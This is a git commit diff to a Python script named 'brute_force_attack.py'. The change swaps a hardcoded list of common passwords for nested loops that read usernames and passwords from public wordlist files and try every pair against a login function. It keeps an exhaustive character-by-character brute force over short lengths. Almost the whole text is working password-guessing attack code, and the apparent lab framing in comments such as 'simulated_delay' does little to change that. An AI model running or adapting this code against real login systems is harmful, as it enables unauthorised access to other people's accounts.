4d226d10fa50faa3d1cd59a98e1aa81fe2b2702c
KevinHe0805 <115117499+KevinHe0805@users.noreply.github.com>
2024-04-12 16:32:37 +0100

    new version of brute force attack with trying more common passwords and usernames.

--- brute_force_attack.py
+++ brute_force_attack.py
@@ -26,19 +26,26 @@ def simulated_delay():
     time.sleep(1)  # Adjust the delay as needed to control the request rate
 
 
-# Use common password patterns or read from a list of common passwords
-common_passwords = ['password', '123456', '123456789', 'qwerty', 'abc123', 'password1', '!@#$%^&*']
-for password in common_passwords:
-    # Log each attempt
-    print(f"Attempting login with Username:'admin', Password: {password}")
-    simulated_delay()  # Reduce the speed of attempts to mimic realistic conditions
-    if attempt_login('admin', password):
-        print(f"Success! Username: 'admin', Password: {password}")
-        break
+# Read usernames and passwords from files
+def read_file(filename):
+    with open(filename, 'r') as file:
+        return [line.strip() for line in file]
+
+
+usernames = read_file('top-usernames-shortlist.txt')
+passwords = read_file('10-million-password-list-top-1000.txt')
+
+# Try logging in with combinations of common usernames and passwords
+for username in usernames:
+    for password in passwords:
+        print(f"Attempting login with Username: {username}, Password: {password}")
+        simulated_delay()
+        if attempt_login(username, password):
+            print(f"Success! Username: {username}, Password: {password}")
+            break
 
 # Try different lengths for username and password
-
-for username_length in range(1, 7):  # Example: Using shorter lengths for demonstration
+for username_length in range(1, 7):
     for password_length in range(1, 7):
         for username in itertools.product(CHAR_SET, repeat=username_length):
             for password in itertools.product(CHAR_SET, repeat=password_length):
